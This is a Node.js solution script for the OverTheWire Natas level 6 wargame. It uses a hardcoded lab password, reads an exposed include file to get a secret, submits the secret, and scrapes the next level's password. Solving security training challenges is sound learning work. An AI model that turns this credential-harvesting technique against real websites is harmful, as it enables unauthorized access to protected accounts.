#!/usr/bin/env node

const axios = require("axios");
const cheerio = require("cheerio");

const username = "natas6";
const password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1";

const url = `http://${username}.natas.labs.overthewire.org/`;

let newUrl = `${url}/includes/secret.inc`;

(async function () {
  const response = await axios.get(newUrl, {
    auth: {
      username: username,
      password: password,
    },
  });

  let $ = cheerio.load(response.data);
  let re = /"(.\w+)"/;
  const secret = $.html().match(re)[1];

  const data = `secret=${encodeURIComponent(secret)}&submit=Submit`;

  // To change data into x-www-form-urlencoded we do this with json data.
  // Object.keys(params).map(key => `key=${encodeURIComponent(params[key])}`).join("&");

  const passwordPageRes = await axios.post(url, data, {
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    auth: { username, password },
  });

  $ = cheerio.load(passwordPageRes.data);
  re = /The password for natas7 is (\w+)/;
  console.log($.html().match(re)[1]);
})();
